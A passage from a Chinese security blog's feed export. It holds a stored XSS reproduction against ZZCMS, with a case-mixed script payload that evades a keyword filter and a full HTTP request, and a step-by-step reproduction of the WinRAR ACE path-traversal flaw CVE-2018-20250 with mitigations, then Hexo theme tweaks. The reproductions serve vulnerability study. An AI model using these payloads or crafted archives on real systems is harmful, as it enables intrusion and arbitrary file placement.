</code></p><p>使用<code>&lt;sCrIpT&gt;alert(/xss/)&lt;/ScRiPt&gt;</code>是因为在<code>/inc/stopsqlin.php</code>中有一段检测函数</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//主要针对在任何文件后加?%3Cscript%3E，即使文件中没有参数</span></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_URI&#x27;</span>],<span class="string">&#x27;script&#x27;</span>)!==<span class="literal">false</span> || <span class="title function_ invoke__">strpos</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_URI&#x27;</span>],<span class="string">&#x27;%26%2399%26%&#x27;</span>)!==<span class="literal">false</span>|| <span class="title function_ invoke__">strpos</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_URI&#x27;</span>],<span class="string">&#x27;%2F%3Cobject&#x27;</span>)!==<span class="literal">false</span>)&#123;</span><br><span class="line"><span class="keyword">die</span> (<span class="string">&quot;无效参数&quot;</span>);<span class="comment">//注意这里不能用js提示</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/images/H67jYWx.png"></p><p>完整包体如下</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /user/ask.php?do=modify&amp;page=1&amp;id=1&amp;aaa=&lt;sCrIpT&gt;alert(/xss/)&lt;/ScRiPt&gt; HTTP/1.1</span><br><span class="line">Host: www.zzcms2019.cc</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Cookie: __tins__713776=%7B%22sid%22%3A%201551009070949%2C%20%22vd%22%3A%205%2C%20%22expires%22%3A%201551010962798%7D; __51cke__=; __51laig__=12; bdshare_firstime=1551002231060; PHPSESSID=8o9ms5t57q6dag7ofku75fn2j7; UserName=test; PassWord=e10adc3949ba59abbe56e057f20f883e</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br></pre></td></tr></table></figure><p>当管理员访问后台中的<strong>用户→用户不良操作记录</strong>时</p><p><img src="/images/VMs1r1r.png"></p><p>即可触发</p><p><img src="/images/MtBdViP.png"></p>]]></content>
      
      
      <categories>
          
          <category> CodeReview </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CodeReview </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WinRAR 远程代码执行漏洞复现</title>
      <link href="/p/1951.html"/>
      <url>/p/1951.html</url>
      
        <content type="html"><![CDATA[<p>WinRAR系列任意代码执行漏洞(CVE-2018-20250、CVE-2018-20251、CVE-2018-20252与CVE-2018-20253)复现</p><span id="more"></span><h1 id="0x00-背景"><a href="#0x00-背景" class="headerlink" title="0x00 背景"></a>0x00 背景</h1><p>WinRAR 作为最流行的解压缩软件，支持多种压缩格式的压缩和解压缩功能。今天，Check Point公司的安全研究员 Nadav Grossman 公开了他在 WinRAR 中发现的一系列漏洞。其中以 ACE 解压缩模块的远程代码执行漏洞（CVE-2018-20250）最具危害力。<br>WinRAR 为支持 ACE 压缩文件的解压缩功能，集成了一个具有 19 年历史的动态共享库 <code>unacev2.dll</code>。 而此共享库自 2006 年以来再未更新过，也未开启任何漏洞利用缓解技术。Nadav Grossman 在 unacev2.dll 中发现了一个目录穿越漏洞，成功利用此漏洞可导致远程代码执行或 NTLM hash 泄露。</p><h1 id="0x02-漏洞影响"><a href="#0x02-漏洞影响" class="headerlink" title="0x02 漏洞影响"></a>0x02 漏洞影响</h1><p>影响版本：</p><blockquote><p>WinRAR &lt; 5.70 Beta 1<br>Bandizip    &lt; &#x3D; 6.2.0.0<br>好压(2345压缩)    &lt; &#x3D; 5.9.8.10907<br>360压缩    &lt; &#x3D; 4.0.0.1170</p></blockquote><h1 id="0x03-复现"><a href="#0x03-复现" class="headerlink" title="0x03 复现"></a>0x03 复现</h1><p>该漏洞的实现过程：首先新建一个任意文件，然后利用WinACE进行压缩，修改filename来实现目录穿越漏洞，可以将文件解压到任意目录中。</p><p>主要所需工具<code>WinACE</code>、<code>010Editor</code>。</p><h2 id="3-1下载WinACE并安装，安装完成后新建一个文本文件，名字任意。"><a href="#3-1下载WinACE并安装，安装完成后新建一个文本文件，名字任意。" class="headerlink" title="3.1下载WinACE并安装，安装完成后新建一个文本文件，名字任意。"></a>3.1下载WinACE并安装，安装完成后新建一个文本文件，名字任意。</h2><p>安装WinACE<br><img src="/images/4EXOh4m.png" alt="安装WinACE"><br>新建文本文件<br><img src="/images/fO5cyZG.png" alt="新建文本文件"><br>然后利用WinACE进行压缩。<br><img src="/images/DIdK6Z2.png" alt="WinACE进行压缩"><br>然后我们下载acefile.py 脚本。</p><blockquote><p>下载地址为:<br><a href="https://github.com/droe/acefile/blob/master/acefile.py">https://github.com/droe/acefile/blob/master/acefile.py</a></p></blockquote><p>使用命令<code>python acefile.py --headers testfile.ace</code>来读取该文件头信息。</p><p><img src="/images/VlpAP9x.png" alt="读取该文件头信息"></p><p>根据漏洞的描述，问题是出现在filename中的。那主要就看下面的header吧。</p><p>用<code>010editor</code>打开该文件。</p><p><img src="/images/IeVvnxj.png"></p><p>需要看选中的部分。<br>对比acefile解析的结果，并明白各个段对应的内容。</p><p><img src="/images/ofCS3YD.png"></p><p>如果要修改<code>filename</code>，则需要修改上面标注这几处。第一处为<code>0x20EE(hdrcrc)</code>,第二处为<code>0x002B(hdrsize)</code>，第三处为<code>0x000C(filename的长度）</code>，以及最后一处为filename。</p><p>修改顺序是由后到前。</p><p>这里修改<code>filename</code>为<code>g:\g:\testsp4ce.txt</code>（<strong>图中D盘因开启了防护软件被拦截了，下文中的d都为g盘</strong>）</p><p>长度为<code>19</code>，对应的hex为<code>0x0013</code></p><p><img src="/images/JtgcTUf.png"></p><p>然后修改<code>hdr_size</code>，长度为<code>50</code>，对应的hex为<code>0x0032</code>。</p><p><img src="/images/xI2gMw7.png"></p><p>接下来就是修改<code>hdr_crc</code>了，这里有一个取巧的方法。</p><p>我们再次运行命令<code>python acefile.py --headers testfile.ace</code></p><p>程序中断并提示<code>CorruptedArchiveError: header CRC failed</code>和正确的<code>CRC</code></p><p><img src="/images/mHkYCIg.png"></p><p>最后改完如下</p><p><img src="/images/oBvtki7.png"></p><p>再次查看，可以正常解析，并看到filename已经修改成功</p><p><img src="/images/m0ZsPMQ.png"></p><p>右键解压到<code>testfile\</code></p><p><img src="/images/z3MZ1bQ.png"></p><p>即可在g盘看到解压出的<code>testsp4ce.txt</code></p><p><img src="/images/z9yE9WC.png"></p><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>经测试，winrar 5.4在解压恶意压缩包时，压缩包在任意目录均可解压触发，且右键的2个解压选项均可触发</p><p><img src="/images/XZ5CSOb.png"></p><h1 id="0x04-缓解措施"><a href="#0x04-缓解措施" class="headerlink" title="0x04 缓解措施"></a>0x04 缓解措施</h1><ol><li>升级WinRAR到5.70beta1</li><li>删除解压软件下的<code>UNACEV2.DLL</code></li></ol><h1 id="0x05-用到的文件"><a href="#0x05-用到的文件" class="headerlink" title="0x05 用到的文件"></a>0x05 用到的文件</h1><p>Github:<a href="https://github.com/NS-Sp4ce/BlogFiles/tree/master/CVE-2018-20250">https://github.com/NS-Sp4ce/BlogFiles/tree/master/CVE-2018-20250</a></p>]]></content>
      
      
      <categories>
          
          <category> VulRepro </category>
          
      </categories>
      
      
        <tags>
            
            <tag> VulRepro </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HEXO的Material主题折腾记</title>
      <link href="/p/4135750794.html"/>
      <url>/p/4135750794.html</url>
      
        <content type="html"><![CDATA[<p>博客自从11月换了个主题后就一直在断断续续的折腾，开个文章记录下折腾日志</p><span id="more"></span><h1 id="首页部分更改"><a href="#首页部分更改" class="headerlink" title="首页部分更改"></a>首页部分更改</h1><h2 id="更改LOGO下的图标"><a href="#更改LOGO下的图标" class="headerlink" title="更改LOGO下的图标"></a>更改LOGO下的图标</h2><p>文件路径<code>\hexo\blog\themes\material\layout\index.ejs</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;i class=&quot;material-icons&quot; role=&quot;presentation&quot;&gt;view_carousel&lt;/i&gt;</span><br><span class="line">&lt;i class=&quot;material-icons&quot; role=&quot;presentation&quot;&gt;more_vert&lt;/i&gt;</span><br></pre></td></tr></table></figure><p>改为</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;i class=&quot;material-icons&quot; role=&quot;presentation&quot;&gt;pages&lt;/i&gt;</span><br><span class="line">&lt;i class=&quot;material-icons&quot; role=&quot;presentation&quot;&gt;share&lt;/i&gt;</span><br></pre></td></tr></table></figure><p>效果图<br><img src="/images/nSGClOf.png"></p><h2 id="首页文章加标签"><a href="#首页文章加标签" class="headerlink" title="首页文章加标签"></a>首页文章加标签</h2><p>路径<code>\hexo\blog\themes\material\layout\_partial\Paradox-post-info.ejs</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;% if (post.categories &amp;&amp; post.categories.length) &#123; %&gt;</span><br><span class="line">    &lt;!-- Category --&gt;</span><br><span class="line">    &lt;span class=&quot;post_entry-category&quot;&gt;</span><br><span class="line">        &lt;%- list_categories(post.categories, &#123;</span><br><span class="line">            show_count: false,</span><br><span class="line">            class: &#x27;post_category&#x27;,</span><br><span class="line">            style: &#x27;none&#x27;</span><br><span class="line">        &#125;) %&gt;</span><br><span class="line">    &lt;/span&gt;</span><br><span class="line">  &lt;% &#125; %&gt;</span><br></pre></td></tr></table></figure><p>改为</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!-- tags --&gt;</span><br><span class="line">&lt;span class=&quot;post_entry-right-info-Tags&quot;&gt;</span><br><span class="line">  &lt;i class=&quot;material-icons&quot;&gt;bookmark_border&lt;/i&gt;</span><br><span class="line">      &lt;%- list_tags(post.tags, &#123;</span><br><span class="line">                  show_count: false,</span><br><span class="line">                  class: &#x27;post-tag&#x27;,</span><br><span class="line">                  style: &#x27;none&#x27;</span><br><span class="line">              &#125;) %&gt;</span><br><span class="line"> &lt;/span&gt;</span><br><span class="line">  &lt;!-- Category --&gt;</span><br><span class="line">  &lt;span class=&quot;post_entry-right-info-Category&quot;&gt;</span><br><span class="line">      &lt;i class=&quot;material-icons&quot;&gt;folder_open&lt;/i&gt;</span><br><span class="line">      &lt;%- list_categories(post.categories, &#123;</span><br><span class="line">                  show_count: false, </span><br><span class="line">                  class: &#x27;post-category&#x27;,</span><br><span class="line">                  style: &#x27;none&#x27;</span><br><span class="line">              &#125;) %&gt;</span><br><span class="line">  &lt;/span&gt;</span><br></pre></td></tr></table></figure><p>效果图<br><img src="/images/SjrKLsD.png"></p><h2 id="底部添加访客数、运行时间站点字数"><a href="#底部添加访客数、运行时间站点字数" class="headerlink" title="底部添加访客数、运行时间站点字数"></a>底部添加访客数、运行时间站点字数</h2><p>该部分需要wordcount支持，请参考下一小节<br><code>\hexo\blog\themes\material\layout\_partial\footer.ejs</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!-- Paradox Footer Left Section --&gt;</span><br><span class="line">&lt;%- partial(&#x27;_partial/footer-left&#x27;) %&gt;</span><br><span class="line"></span><br><span class="line">&lt;!--Copyright--&gt;</span><br><span class="line">&lt;div id=&quot;copyright&quot;&gt;</span><br><span class="line">    Copyright&amp;nbsp;©&amp;nbsp;&lt;span year&gt;&lt;/span&gt;&amp;nbsp;&lt;%- config.title %&gt;</span><br><span class="line">    &lt;% if(theme.footer_text) &#123; %&gt;</span><br><span class="line">        &lt;br&gt;</span><br><span class="line">        &lt;% if(Array.isArray(theme.footer_text)) &#123; %&gt;</span><br><span class="line">            &lt;%- theme.footer_text.join(&#x27;&lt;br&gt;&#x27;) %&gt;</span><br><span class="line">        &lt;% &#125; else &#123; %&gt;</span><br><span class="line">            &lt;%- theme.footer_text %&gt;</span><br><span class="line">        &lt;% &#125; %&gt;</span><br><span class="line">    &lt;% &#125; %&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- Paradox Footer Right Section --&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>改为</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">   &lt;!-- Paradox Footer Left Section --&gt;</span><br><span class="line">   &lt;%- partial(&#x27;_partial/footer-left&#x27;) %&gt;</span><br><span class="line">   &lt;!--Copyright--&gt;</span><br><span class="line">   &lt;div id=&quot;copyright&quot;&gt;</span><br><span class="line">       Copyright&amp;nbsp;©&amp;nbsp;&lt;span year&gt;&lt;/span&gt;&amp;nbsp;</span><br><span class="line">       &lt;%- config.title %&gt;</span><br><span class="line">       &lt;% if(theme.footer_text) &#123; %&gt;</span><br><span class="line">       &lt;br&gt;</span><br><span class="line">       &lt;% if(Array.isArray(theme.footer_text)) &#123; %&gt;</span><br><span class="line">       &lt;%- theme.footer_text.join(&#x27;&lt;br&gt;&#x27;) %&gt;</span><br><span class="line">       &lt;% &#125; else &#123; %&gt;</span><br><span class="line">       &lt;%- theme.footer_text %&gt;</span><br><span class="line">       &lt;% &#125; %&gt;</span><br><span class="line">       &lt;% &#125; %&gt;</span><br><span class="line">       &lt;% if(theme.busuanzi.all_site_uv === true) &#123; %&gt;</span><br><span class="line">   &lt;!-- All Site UV --&gt;</span><br><span class="line">   &lt;br /&gt;</span><br><span class="line">   &lt;span id=&quot;busuanzi_container_site_uv&quot;&gt;本站访客数</span><br><span class="line">       &lt;span id=&quot;busuanzi_value_site_uv&quot;&gt;</span><br><span class="line">       &lt;/span&gt;</span><br><span class="line">   &lt;/span&gt;|</span><br><span class="line">   &lt;span id=&quot;busuanzi_container_site_pv&quot;&gt;本站总访问量</span><br><span class="line">       &lt;span id=&quot;busuanzi_value_site_pv&quot;&gt;</span><br><span class="line">           </span><br><span class="line">       &lt;/span&gt;</span><br><span class="line">   &lt;/span&gt;|</span><br><span class="line">   &lt;i class=&quot;material-icons&quot;&gt;keyboard&lt;/i&gt;站点总字数&lt;span class=&quot;post-count&quot;&gt;&lt;%= totalcount(site) %&gt;&lt;/span&gt;</span><br><span class="line">   &lt;% &#125; %&gt;</span><br><span class="line">   &lt;div class=&quot;footer-site-time&quot;&gt;</span><br><span class="line">   &lt;span id=&quot;timeDate&quot;&gt;载入天数...&lt;/span&gt;</span><br><span class="line">   &lt;span id=&quot;times&quot;&gt;载入时分秒...&lt;/span&gt;</span><br><span class="line">   &lt;/div&gt;</span><br><span class="line">   &lt;/div&gt;</span><br><span class="line">   </span><br><span class="line">   &lt;script&gt;</span><br><span class="line">   var now = new Date(); </span><br><span class="line">   function createtime() &#123; </span><br><span class="line">       var grt= new Date(&quot;01/01/2016 00:00:00&quot;);//此处修改你的建站时间或者网站上线时间 </span><br><span class="line">       now.setTime(now.getTime()+250); </span><br><span class="line">       days = (now - grt ) / 1000 / 60 / 60 / 24; dnum = Math.floor(days); </span><br><span class="line">       hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum); hnum = Math.floor(hours); </span><br><span class="line">       if(String(hnum).length ==1 )&#123;hnum = &quot;0&quot; + hnum;&#125; minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum); </span><br><span class="line">       mnum = Math.floor(minutes); if(String(mnum).length ==1 )&#123;mnum = &quot;0&quot; + mnum;&#125; </span><br><span class="line">       seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum); </span><br><span class="line">       snum = Math.round(seconds); if(String(snum).length ==1 )&#123;snum = &quot;0&quot; + snum;&#125; </span><br><span class="line">       document.getElementById(&quot;timeDate&quot;).innerHTML = &quot;本站已安全运行 &quot;+dnum+&quot; 天 &quot;; </span><br><span class="line">       document.getElementById(&quot;times&quot;).innerHTML = hnum + &quot; 小时 &quot; + mnum + &quot; 分 &quot; + snum + &quot; 秒&quot;; </span><br><span class="line">   &#125; </span><br><span class="line">   setInterval(&quot;createtime()&quot;,250);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><h2 id="首页底部分页优化"><a href="#首页底部分页优化" class="headerlink" title="首页底部分页优化"></a>首页底部分页优化</h2><p><code>\hexo\blog\themes\material\source\css\style.min.css</code></p><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-id">#scheme-Paradox</span> <span class="selector-class">.page-number</span> &#123;</span><br><span class="line">    <span class="attribute">line-height</span>: <span class="number">2</span>;</span><br><span class="line">    <span class="attribute">position</span>: relative;</span><br><span class="line">    <span class="attribute">top</span>: -<span class="number">1px</span>;</span><br><span class="line">    <span class="attribute">display</span>: inline-block;</span><br><span class="line">    <span class="attribute">margin</span>: <span class="number">0</span> <span class="number">10px</span>;</span><br><span class="line">    <span class="attribute">padding</span>: <span class="number">0</span> <span class="number">11px</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.pagination</span> &#123;</span><br><span class="line">    <span class="attribute">display</span>: inline-block <span class="meta">!important</span>;</span><br><span class="line">    <span class="attribute">margin</span>: <span class="number">120px</span> <span class="number">0</span> <span class="number">40px</span>;</span><br><span class="line">    <span class="attribute">text-align</span>: center;</span><br><span class="line">    <span class="attribute">border-top</span>: <span class="number">1px</span> solid <span class="number">#eee</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-id">#scheme-Paradox</span> <span class="selector-class">.material-nav</span> <span class="selector-class">.page-number</span><span class="selector-class">.current</span> &#123;</span><br><span class="line">    <span class="attribute">color</span>: <span class="number">#fff</span>;</span><br><span class="line">    <span class="attribute">border-top-color</span>: <span class="number">#ccc</span>;</span><br><span class="line">    <span class="attribute">background</span>: <span class="number">#ccc</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>效果图<br><img src="/images/kSISTKX.png"></p><h1 id="文章页"><a href="#文章页" class="headerlink" title="文章页"></a>文章页</h1><p>头部添加阅读时长需要wordcount插件<br>首先，cd到你的blog目录，然后执行<code>npm i --save hexo-wordcount</code>,<br>修改文件<br><code>hexo\blog\themes\material\layout\_partial\Paradox-post-info.ejs</code><br>部分内容如下</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">    &lt;% if(theme.wordcount.enable === true) &#123; %&gt;</span><br><span class="line">    |</span><br><span class="line">    &lt;i class=&quot;material-icons&quot;&gt;keyboard&lt;/i&gt;&lt;span class=&quot;post-count&quot;&gt;本文共:&lt;%= wordcount(page.content) %&gt;字&lt;/span&gt;</span><br><span class="line">    |</span><br><span class="line">    &lt;i class=&quot;material-icons&quot;&gt;query_builder&lt;/i&gt;&lt;span class=&quot;post-count&quot;&gt;阅读时间≈&lt;%= min2read(page.content) %&gt;分&lt;/span&gt;</span><br><span class="line">    |</span><br><span class="line">    &lt;% &#125; %&gt;</span><br><span class="line">    &lt;!-- Favorite --&gt;</span><br><span class="line">    &lt;!--</span><br><span class="line">    &lt;button id=&quot;article-functions-like-button&quot; class=&quot;mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon btn-like&quot;&gt;</span><br><span class="line">        &lt;i class=&quot;material-icons&quot; role=&quot;presentation&quot;&gt;favorite&lt;/i&gt;</span><br><span class="line">        &lt;span class=&quot;visuallyhidden&quot;&gt;favorites&lt;/span&gt;</span><br><span class="line">    &lt;/button&gt;</span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure><p><code>\hexo\blog\themes\material\_config.yml</code>文件末尾添加内容如下</p><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line"><span class="section">#wordcount</span></span><br><span class="line">wordcount:</span><br><span class="line"><span class="code">    enable: true</span></span><br></pre></td></tr></table></figure><p>然后重新生成页面<br>首页下部截图<br><img src="/images/S736bs1.png"><br>文章页截图<br><img src="/images/PjRWXTZ.png"></p><h2 id="删除分享列表内的浏览人数并转移到外部"><a href="#删除分享列表内的浏览人数并转移到外部" class="headerlink" title="删除分享列表内的浏览人数并转移到外部"></a>删除分享列表内的浏览人数并转移到外部</h2><p>文件<code>\hexo\blog\themes\material\layout\_partial\post-info-share.ejs</code><br>删除</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;% if(theme.busuanzi.enable === true) &#123; %&gt;</span><br><span class="line">    &lt;% if(theme.busuanzi.post_pv === true) &#123; %&gt;</span><br><span class="line">        &lt;!-- Busuanzi Views --&gt;</span><br><span class="line">        &lt;a class=&quot;post_share-link&quot; href=&quot;#&quot;&gt;</span><br><span class="line">            &lt;li class=&quot;mdl-menu__item&quot;&gt;</span><br><span class="line">                &lt;span id=&quot;busuanzi_container_page_pv&quot;&gt;</span><br><span class="line">                    &lt;span id=&quot;busuanzi_value_page_pv&quot;&gt;&lt;/span&gt;&amp;nbsp;&lt;%= __(&#x27;post.views&#x27;) %&gt;</span><br><span class="line">                &lt;/span&gt;</span><br><span class="line">            &lt;/li&gt;</span><br><span class="line">        &lt;/a&gt;</span><br><span class="line">    &lt;% &#125; %&gt;</span><br><span class="line">&lt;% &#125; %&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>文件<code>\hexo\blog\themes\material\layout\_partial\Paradox-post-info.ejs</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!-- Author Name &amp; Date --&gt;</span><br><span class="line">&lt;div&gt;</span><br><span class="line">    &lt;strong&gt;&lt;%= config.author %&gt;&lt;/strong&gt;</span><br><span class="line">    &lt;span&gt;&lt;%= date(page.date, &#x27;MMM DD, YYYY&#x27;) %&gt;&lt;/span&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line"></span><br><span class="line">&lt;div class=&quot;section-spacer&quot;&gt;&lt;/div&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- Favorite --&gt;</span><br><span class="line">&lt;!--</span><br></pre></td></tr></table></figure><p>改为</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!-- Author Name &amp; Date --&gt;</span><br><span class="line">&lt;div&gt;</span><br><span class="line">    &lt;strong&gt;&lt;%= config.author %&gt;&lt;/strong&gt;</span><br><span class="line">    &lt;span&gt;&lt;%= date(page.date, &#x27;MMM DD, YYYY&#x27;) %&gt;&lt;/span&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;div class=&quot;section-spacer&quot;&gt;&lt;/div&gt;</span><br><span class="line">&lt;% if(theme.busuanzi.enable === true) &#123; %&gt;</span><br><span class="line">&lt;% if(theme.busuanzi.post_pv === true) &#123; %&gt;</span><br><span class="line">&lt;!-- Busuanzi Views --&gt;</span><br><span class="line">&lt;span id=&quot;busuanzi_container_page_pv&quot;&gt;</span><br><span class="line">            &lt;span id=&quot;busuanzi_value_page_pv&quot;&gt;&lt;/span&gt;&amp;nbsp;</span><br><span class="line">&lt;%= __(&#x27;post.views&#x27;) %&gt;</span><br><span class="line">&lt;/span&gt;</span><br><span class="line">&lt;% &#125; %&gt;</span><br><span class="line">&lt;% &#125; %&gt;</span><br><span class="line">&lt;!-- Favorite --&gt;</span><br><span class="line">&lt;!--</span><br></pre></td></tr></table></figure><p>预览图<br><img src="/images/yruh3Pq.png"></p><h2 id="文章底部添加前后文章名"><a href="#文章底部添加前后文章名" class="headerlink" title="文章底部添加前后文章名"></a>文章底部添加前后文章名</h2><p>文件<code>\hexo\blog\themes\material\layout\_partial\post-nav.ejs</code></p><p><code>&lt;%= __(&#39;post.older&#39;) %&gt;</code>改为<code>&lt;%= page.next.title %&gt;</code><br><code>&lt;%= __(&#39;post.newer&#39;) %&gt;</code>改为&#96;&#96;&lt;%&#x3D; page.prev.title %&gt;&#96;<br>如图<br><img src="/images/s38MFFX.png"><br>预览图<br><img src="/images/sPE20Hb.png"></p><h2 id="文章标题修复"><a href="#文章标题修复" class="headerlink" title="文章标题修复"></a>文章标题修复</h2><p><code>\hexo\blog\themes\material\layout\_partial\Paradox-post_entry.ejs</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;p class=&quot;article-headline-p&quot;&gt;&lt;a href=&quot;&lt;%= url_for(post.path) %&gt;&quot;&gt;&lt;% if(pin) &#123; %&gt;&lt;span&gt;[Top]&lt;/span&gt;&lt;% &#125; %&gt;&lt;%= post.title %&gt;&lt;/a&gt;&lt;/p&gt;</span><br><span class="line">&lt;a class=&quot;article-headline-p&quot; href=&quot;&lt;%= url_for(post.path) %&gt;&quot; &gt;&lt;% if(pin) &#123; %&gt;&lt;span&gt;[Top]&lt;/span&gt;&lt;% &#125; %&gt;&lt;%= post.title %&gt;&lt;/a&gt;</span><br></pre></td></tr></table></figure><h2 id="利用-Fancybox-添加图片放大预览查看功能"><a href="#利用-Fancybox-添加图片放大预览查看功能" class="headerlink" title="利用 Fancybox 添加图片放大预览查看功能"></a>利用 Fancybox 添加图片放大预览查看功能</h2><p>首先把fancybox的dist目录下的.min.js文件解压到<code>\hexo\blog\themes\material\source\js</code>目录下，然后把.min.css文件解压到<code>\hexo\blog\themes\material\source\css</code>目录下，然后把下面的JS代码保存为utils.js扔到<code>\hexo\blog\themes\material\source\js</code>目录下<br>utils.js</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">$(<span class="variable language_">document</span>).<span class="title function_">ready</span>(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="title function_">wrapImageWithFancyBox</span>();</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Wrap images with fancybox support.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">wrapImageWithFancyBox</span>(<span class="params"></span>) &#123;</span><br><span class="line">    $(<span class="string">&#x27;img&#x27;</span>).<span class="title function_">not</span>(<span class="string">&#x27;.sidebar-image img&#x27;</span>).<span class="title function_">not</span>(<span class="string">&#x27;#author-avatar img&#x27;</span>).<span class="title function_">not</span>(<span class="string">&quot;.mdl-menu img&quot;</span>).<span class="title function_">each</span>(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> $image = $(<span class="variable language_">this</span>);</span><br><span class="line">        <span class="keyword">var</span> imageCaption = $image.<span class="title function_">attr</span>(<span class="string">&#x27;alt&#x27;</span>);</span><br><span class="line">        <span class="keyword">var</span> $imageWrapLink = $image.<span class="title function_">parent</span>(<span class="string">&#x27;a&#x27;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ($imageWrapLink.<span class="title function_">size</span>() &lt; <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> src = <span class="variable language_">this</span>.<span class="title function_">getAttribute</span>(<span class="string">&#x27;src&#x27;</span>);</span><br><span class="line">            <span class="keyword">var</span> idx = src.<span class="title function_">lastIndexOf</span>(<span class="string">&#x27;?&#x27;</span>);</span><br><span class="line">            <span class="keyword">if</span> (idx != -<span class="number">1</span>) &#123;</span><br><span class="line">                src = src.<span class="title function_">substring</span>(<span class="number">0</span>, idx);</span><br><span class="line">            &#125;</span><br><span class="line">            $imageWrapLink = $image.<span class="title function_">wrap</span>(<span class="string">&#x27;&lt;a href=&quot;&#x27;</span> + src + <span class="string">&#x27;&quot;&gt;&lt;/a&gt;&#x27;</span>).<span class="title function_">parent</span>(<span class="string">&#x27;a&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $imageWrapLink.<span class="title function_">attr</span>(<span class="string">&#x27;data-fancybox&#x27;</span>, <span class="string">&#x27;images&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span> (imageCaption) &#123;</span><br><span class="line">            $imageWrapLink.<span class="title function_">attr</span>(<span class="string">&#x27;data-caption&#x27;</span>, imageCaption);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    $().<span class="title function_">fancybox</span>(&#123;</span><br><span class="line">        selector : <span class="string">&#x27;[data-fancybox=&quot;images&quot;]&#x27;</span>,</span><br><span class="line">        thumbs : <span class="literal">true</span>,</span><br><span class="line">        hash : <span class="literal">false</span>,</span><br><span class="line">        loop : <span class="literal">false</span>,</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>\hexo\blog\themes\material\source\js</code>目录结构大致如下<br><img src="/images/Ye7UZud.png"><br><code>\hexo\blog\themes\material\source\css</code>目录结构大致如下<br><img src="/images/xMzzCZJ.png"><br>然后在<code>/material/layout/_partial/head.ejs</code>文件</head>标签之前加入</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!-- fancybox support --&gt;</span><br><span class="line">&lt;% if(theme.fancybox === true) &#123; %&gt;</span><br><span class="line">    &lt;%- cssLsload(&#123;path:(&#x27;css/jquery.fancybox.min.css&#x27;),key:&#x27;fancybox_css&#x27;&#125;) %&gt;</span><br><span class="line">    &lt;%- jsLsload(&#123;path:(&#x27;js/jquery.fancybox.min.js&#x27;),key:&#x27;fancybox_js&#x27;&#125;) %&gt;</span><br><span class="line">    &lt;%- jsLsload(&#123;path:(&#x27;js/utils.js&#x27;),key:&#x27;utils_js&#x27;&#125;) %&gt;</span><br><span class="line">&lt;% 